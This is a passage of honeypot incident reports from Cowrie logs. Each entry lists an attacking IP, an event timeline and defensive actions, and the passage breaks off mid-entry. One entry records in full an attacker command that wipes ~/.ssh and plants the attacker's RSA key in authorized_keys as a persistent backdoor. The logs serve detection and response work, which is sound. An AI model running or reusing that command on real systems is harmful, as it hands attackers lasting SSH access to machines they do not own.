### 🔴 HIGH · IR-c52f55a27e89

| Field | Detail |
|---|---|
| **Source IP** | `103.68.22[.]115` |
| **First Seen** | 2026-07-15 01:52 |
| **Last Seen** | 2026-07-15 01:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 01:52:23` | `cowrie.session.connect` |
| `2026-07-15 01:52:24` | `cowrie.client.version` |
| `2026-07-15 01:52:24` | `cowrie.client.kex` |
| `2026-07-15 01:52:26` | `cowrie.login.success` |
| `2026-07-15 01:52:27` | `cowrie.direct-tcpip.request` |
| `2026-07-15 01:52:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.68.22[.]115` to AbuseIPDB if not already reported
- [ ] Block `103.68.22[.]115` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5987ee0786d6

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-15 01:52 |
| **Last Seen** | 2026-07-15 01:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 01:52:26` | `cowrie.session.connect` |
| `2026-07-15 01:52:26` | `cowrie.client.version` |
| `2026-07-15 01:52:26` | `cowrie.client.kex` |
| `2026-07-15 01:52:27` | `cowrie.login.success` |
| `2026-07-15 01:52:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-924785706723

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-15 01:52 |
| **Last Seen** | 2026-07-15 01:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 01:52:26` | `cowrie.session.connect` |
| `2026-07-15 01:52:26` | `cowrie.client.version` |
| `2026-07-15 01:52:26` | `cowrie.client.kex` |
| `2026-07-15 01:52:27` | `cowrie.login.success` |
| `2026-07-15 01:52:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba7261abc666

| Field | Detail |
|---|---|
| **Source IP** | `61.37.150[.]6` |
| **First Seen** | 2026-07-15 01:54 |
| **Last Seen** | 2026-07-15 01:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 01:54:29` | `cowrie.session.connect` |
| `2026-07-15 01:54:30` | `cowrie.client.version` |
| `2026-07-15 01:54:30` | `cowrie.client.kex` |
| `2026-07-15 01:54:32` | `cowrie.login.success` |
| `2026-07-15 01:54:33` | `cowrie.direct-tcpip.request` |
| `2026-07-15 01:54:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.37.150[.]6` to AbuseIPDB if not already reported
- [ ] Block `61.37.150[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04c2eb2fa838

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 02:02 |
| **Last Seen** | 2026-07-15 02:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 02:02:09` | `cowrie.session.connect` |
| `2026-07-15 02:02:09` | `cowrie.client.version` |
| `2026-07-15 02:02:09` | `cowrie.client.kex` |
| `2026-07-15 02:02:10` | `cowrie.login.success` |
| `2026-07-15 02:02:10` | `cowrie.session.params` |
| `2026-07-15 02:02:10` | `cowrie.command.input` |
| `2026-07-15 02:02:10` | `cowrie.log.closed` |
| `2026-07-15 02:02:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9291fe5ec216

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-15 02:08 |
| **Last Seen** | 2026-07-15 02:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 02:08:01` | `cowrie.session.connect` |
| `2026-07-15 02:08:01` | `cowrie.client.version` |
| `2026-07-15 02:08:01` | `cowrie.client.kex` |
| `2026-07-15 02:08:01` | `cowrie.login.success` |
| `2026-07-15 02:08:01` | `cowrie.direct-tcpip.request` |
| `2026-07-15 02:08:01` | `cowrie.direct-tcpip.data` |
| `2026-07-15 02:08:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48f5eb4c65fe

| Field | Detail |
|---|---|
| **Source IP** | `14.153.244[.]142` |
| **First Seen** | 2026-07-15 02:13 |
| **Last Seen** | 2026-07-15 02:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 02:13:49` | `cowrie.session.connect` |
| `2026-07-15 02:13:50` | `cowrie.client.version` |
| `2026-07-15 02:13:50` | `cowrie.client.kex` |
| `2026-07-15 02:13:52` | `cowrie.login.success` |
| `2026-07-15 02:13:53` | `cowrie.direct-tcpip.request` |
| `2026-07-15 02:13:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.153.244[.]142` to AbuseIPDB if not already reported
- [ ] Block `14.153.244[.]142` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8625fc6d873f

| Field | Detail |
|---|---|
| **Source IP** | `24.97.253[.]246` |
| **First Seen** | 2026-07-15 02:13 |
| **Last Seen** | 2026-07-15 02:18 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 02:13:52` | `cowrie.session.connect` |
| `2026-07-15 02:13:53` | `cowrie.client.version` |
| `2026-07-15 02:13:53` | `cowrie.client.kex` |
| `2026-07-15 02:13:54` | `cowrie.login.success` |
| `2026-07-15 02:13:54` | `cowrie.direct-tcpip.request` |
| `2026-07-15 02:18:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.97.253[.]246` to AbuseIPDB if not already reported
- [ ] Block `24.97.253[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0546ac1a5d32

| Field | Detail |
|---|---|
| **Source IP** | `222.236.155[.]146` |
| **First Seen** | 2026-07-15 02:17 |
| **Last Seen** | 2026-07-15 02:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 02:17:08` | `cowrie.session.connect` |
| `2026-07-15 02:17:09` | `cowrie.client.version` |
| `2026-07-15 02:17:09` | `cowrie.client.kex` |
| `2026-07-15 02:17:12` | `cowrie.login.success` |
| `2026-07-15 02:17:12` | `cowrie.direct-tcpip.request` |
| `2026-07-15 02:17:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.236.155[.]146` to AbuseIPDB if not already reported
- [ ] Block `222.236.155[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd4ed4223c67

| Field | Detail |
|---|---|
| **Source IP** | `92.62.74[.]41` |
| **First Seen** | 2026-07-15 02:17 |
| **Last Seen** | 2026-07-15 02:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 02:17:20` | `cowrie.session.connect` |
| `2026-07-15 02:17:21` | `cowrie.client.version` |
| `2026-07-15 02:17:21` | `cowrie.client.kex` |
| `2026-07-15 02:17:22` | `cowrie.login.success` |
| `2026-07-15 02:17:23` | `cowrie.direct-tcpip.request` |
| `2026-07-15 02:17:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.62.74[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.62.74[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6d73634f7de

| Field | Detail |
|---|---|
| **Source IP** | `36.137.38[.]119` |
| **First Seen** | 2026-07-15 02:17 |
| **Last Seen** | 2026-07-15 02:17 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 02:17:22` | `cowrie.session.connect` |
| `2026-07-15 02:17:23` | `cowrie.client.version` |
| `2026-07-15 02:17:23` | `cowrie.client.kex` |
| `2026-07-15 02:17:28` | `cowrie.login.success` |
| `2026-07-15 02:17:29` | `cowrie.direct-tcpip.request` |
| `2026-07-15 02:17:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.137.38[.]119` to AbuseIPDB if not already reported
- [ ] Block `36.137.38[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe3ba9dfa14c

| Field | Detail |
|---|---|
| **Source IP** | `69.126.144[.]30` |
| **First Seen** | 2026-07-15 02:19 |
| **Last Seen** | 2026-07-15 02:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 02:19:45` | `cowrie.session.connect` |
| `2026-07-15 02:19:45` | `cowrie.client.version` |
| `2026-07-15 02:19:45` | `cowrie.client.kex` |
| `2026-07-15 02:19:46` | `cowrie.login.success` |
| `2026-07-15 02:19:47` | `cowrie.direct-tcpip.request` |
| `2026-07-15 02:19:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.126.144[.]30` to AbuseIPDB if not already reported
- [ ] Block `69.126.144[.]30` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7ce6f8059a7

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-15 02:25 |
| **Last Seen** | 2026-07-15 02:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 02:25:01` | `cowrie.session.connect` |
| `2026-07-15 02:25:01` | `cowrie.client.version` |
| `2026-07-15 02:25:02` | `cowrie.client.kex` |
| `2026-07-15 02:25:02` | `cowrie.login.success` |
| `2026-07-15 02:25:02` | `cowrie.direct-tcpip.request` |
| `2026-07-15 02:25:02` | `cowrie.direct-tcpip.data` |
| `2026-07-15 02:25:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33af2e6ce826

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-15 02:27 |
| **Last Seen** | 2026-07-15 02:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 02:27:08` | `cowrie.session.connect` |
| `2026-07-15 02:27:08` | `cowrie.client.version` |
| `2026-07-15 02:27:08` | `cowrie.client.kex` |
| `2026-07-15 02:27:08` | `cowrie.login.success` |
| `2026-07-15 02:27:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fd20f4da013

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-15 02:27 |
| **Last Seen** | 2026-07-15 02:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 02:27:09` | `cowrie.session.connect` |
| `2026-07-15 02:27:09` | `cowrie.client.version` |
| `2026-07-15 02:27:09` | `cowrie.client.kex` |
| `2026-07-15 02:27:10` | `cowrie.login.success` |
| `2026-07-15 02:27:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84ecb3a1fd81

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-15 02:27 |
| **Last Seen** | 2026-07-15 02:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 02:27:15` | `cowrie.session.connect` |
| `2026-07-15 02:27:15` | `cowrie.client.version` |
| `2026-07-15 02:27:15` | `cowrie.client.kex` |
| `2026-07-15 02:27:15` | `cowrie.login.success` |
| `2026-07-15 02:27:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6310310da72

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-15 02:27 |
| **Last Seen** | 2026-07-15 02:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 02:27:15` | `cowrie.session.connect` |
| `2026-07-15 02:27:15` | `cowrie.client.version` |
| `2026-07-15 02:27:15` | `cowrie.client.kex` |
| `2026-07-15 02:27:15` | `cowrie.login.success` |
| `2026-07-15 02:27:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cbc13f5b033

| Field | Detail |
|---|---|
| **Source IP** | `107.189.10[.]124` |
| **First Seen** | 2026-07-15 02:29 |
| **Last Seen** | 2026-07-15 02:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 02:29:16` | `cowrie.session.connect` |
| `2026-07-15 02:29:17` | `cowrie.telnet.option` |
| `2026-07-15 02:29:17` | `cowrie.telnet.option` |
| `2026-07-15 02:30:17` | `cowrie.login.success` |
| `2026-07-15 02:30:18` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `107.189.10[.]124` to AbuseIPDB if not already reported
- [ ] Block `107.189.10[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0116d3be25cb

| Field | Detail |
|---|---|
| **Source IP** | `14.103.117[.]91` |
| **First Seen** | 2026-07-15 02:29 |
| **Last Seen** | 2026-07-15 02:30 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 02:29:51` | `cowrie.session.connect` |
| `2026-07-15 02:29:51` | `cowrie.client.version` |
| `2026-07-15 02:30:03` | `cowrie.client.kex` |
| `2026-07-15 02:30:05` | `cowrie.login.success` |
| `2026-07-15 02:30:06` | `cowrie.session.params` |
| `2026-07-15 02:30:06` | `cowrie.command.input` |
| `2026-07-15 02:30:06` | `cowrie.command.failed` |
| `2026-07-15 02:30:08` | `cowrie.log.closed` |
| `2026-07-15 02:30:09` | `cowrie.session.params` |
| `2026-07-15 02:30:09` | `cowrie.command.input` |
| `2026-07-15 02:30:11` | `cowrie.session.file_download` |
| `2026-07-15 02:30:11` | `cowrie.log.closed` |
| `2026-07-15 02:30:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.117[.]91` to AbuseIPDB if not already reported
- [ ] Block `14.103.117[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d32083ec636

| Field | Detail |
|---|---|
| **Source IP** | `14.103.117[.]91` |
| **First Seen** | 2026-07-15 02:30 |
| **Last Seen** | 2026-07-15 02:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 02:30:11` | `cowrie.session.connect` |
| `2026-07-15 02:30:11` | `cowrie.client.version` |
| `2026-07-15 02:30:12` | `cowrie.client.kex` |
| `2026-07-15 02:30:12` | `cowrie.login.success` |
| `2026-07-15 02:30:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.117[.]91` to AbuseIPDB if not already reported
- [ ] Block `14.103.117[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-305de7dd7769

| Field | Detail |
|---|---|
| **Source IP** | `14.103.117[.]91` |
| **First Seen** | 2026-07-15 02:30 |
| **Last Seen** | 2026-07-15 02:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 02:30:13` | `cowrie.session.connect` |
| `2026-07-15 02:30:13` | `cowrie.client.version` |
| `2026-07-15 02:30:13` | `cowrie.client.kex` |
| `2026-07-15 02:30:15` | `cowrie.login.success` |
| `2026-07-15 02:30:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.117[.]91` to AbuseIPDB if not already reported
- [ ] Block `14.103.117[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5719cf92ac1f

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 02:38 |
| **Last Seen** | 2026-07-15 02:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 02:38:04` | `cowrie.session.connect` |
| `2026-07-15 02:38:04` | `cowrie.client.version` |
| `2026-07-15 02:38:05` | `cowrie.client.kex` |
| `2026-07-15 02:38:05` | `cowrie.login.success` |
| `2026-07-15 02:38:06` | `cowrie.session.params` |
| `2026-07-15 02:38:06` | `cowrie.command.input` |
| `2026-07-15 02:38:06` | `cowrie.log.closed` |
| `2026-07-15 02:38:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7763c9f4c546

| Field | Detail |
|---|---|
| **Source IP** | `223.85.251[.]55` |
| **First Seen** | 2026-07-15 02:38 |
| **Last Seen** | 2026-07-15 02:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 02:38:27` | `cowrie.session.connect` |
| `2026-07-15 02:38:29` | `cowrie.telnet.option` |
| `2026-07-15 02:40:27` | `cowrie.login.success` |
| `2026-07-15 02:40:27` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `223.85.251[.]55` to AbuseIPDB if not already reported
- [ ] Block `223.85.251[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a58aaf12fabc

| Field | Detail |
|---|---|
| **Source IP** | `189.56.0[.]19` |
| **First Seen** | 2026-07-15 02:40 |
| **Last Seen** | 2026-07-15 02:40 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 02:40:34` | `cowrie.session.connect` |
| `2026-07-15 02:40:37` | `cowrie.client.version` |
| `2026-07-15 02:40:37` | `cowrie.client.kex` |
| `2026-07-15 02:40:41` | `cowrie.login.success` |
| `2026-07-15 02:40:42` | `cowrie.direct-tcpip.request` |
| `2026-07-15 02:40:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.56.0[.]19` to AbuseIPDB if not already reported
- [ ] Block `189.56.0[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1425c2fceabf

| Field | Detail |
|---|---|
| **Source IP** | `116.72.9[.]151` |
| **First Seen** | 2026-07-15 02:43 |
| **Last Seen** | 2026-07-15 02:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 02:43:12` | `cowrie.session.connect` |
| `2026-07-15 02:43:13` | `cowrie.client.version` |
| `2026-07-15 02:43:13` | `cowrie.client.kex` |
| `2026-07-15 02:43:16` | `cowrie.login.success` |
| `2026-07-15 02:43:16` | `cowrie.direct-tcpip.request` |
| `2026-07-15 02:43:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.72.9[.]151` to AbuseIPDB if not already reported
- [ ] Block `116.72.9[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e02c5e72a56

| Field | Detail |
|---|---|
| **Source IP** | `113.158.205[.]225` |
| **First Seen** | 2026-07-15 02:43 |
| **Last Seen** | 2026-07-15 02:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 02:43:22` | `cowrie.session.connect` |
| `2026-07-15 02:43:22` | `cowrie.client.version` |
| `2026-07-15 02:43:22` | `cowrie.client.kex` |
| `2026-07-15 02:43:25` | `cowrie.login.success` |
| `2026-07-15 02:43:25` | `cowrie.direct-tcpip.request` |
| `2026-07-15 02:43:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.158.205[.]225` to AbuseIPDB if not already reported
- [ ] Block `113.158.205[.]225` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a832bccbccaa

| Field | Detail |
|---|---|
| **Source IP** | `211.247.127[.]250` |
| **First Seen** | 2026-07-15 02:44 |
| **Last Seen** | 2026-07-15 02:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 02:44:15` | `cowrie.session.connect` |
| `2026-07-15 02:44:16` | `cowrie.client.version` |
